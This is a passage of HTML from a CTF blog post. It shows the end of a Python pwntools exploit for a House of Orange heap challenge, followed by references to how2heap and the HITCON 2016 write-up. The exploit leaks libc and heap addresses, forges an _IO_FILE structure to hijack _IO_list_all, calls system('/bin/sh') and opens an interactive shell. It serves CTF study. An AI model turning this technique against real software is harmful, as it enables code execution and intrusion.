</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc base&#34;</span><span class=p>,</span> <span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x3C5178</span>
</span></span><span class=line><span class=cl>    <span class=c1># libc_base = libc_addr - 0x39C178</span>
</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc base&#34;</span><span class=p>,</span> <span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># leak heap addr</span>
</span></span><span class=line><span class=cl>    <span class=n>upgrade</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name of house : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>16</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;heap addr&#34;</span><span class=p>,</span> <span class=n>heap_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># IO_FILE</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x420</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span>                               <span class=c1># start offset: 0x0</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;_IO_list_all&#34;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># start offset: 0x10</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x90</span>                              <span class=c1># start offset: 0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span>                                       <span class=c1># start offset: 0xc0</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_addr</span><span class=o>+</span><span class=mh>0x430</span><span class=o>+</span><span class=mh>0xe0</span><span class=p>)</span>                                <span class=c1># start offset: 0xd8</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>])</span>            <span class=c1># start offset: 0xe0</span>
</span></span><span class=line><span class=cl>    <span class=n>upgrade</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reference>reference<a hidden class=anchor aria-hidden=true href=#reference>#</a></h2><ol><li>how2heap house_of_orange.c</li><li><a href=https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/>https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li><li><a href=https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html>https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a></li><li><a href=https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/>https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li><li><a href=https://hhdx.xyz/tags/how2heap/>How2heap</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>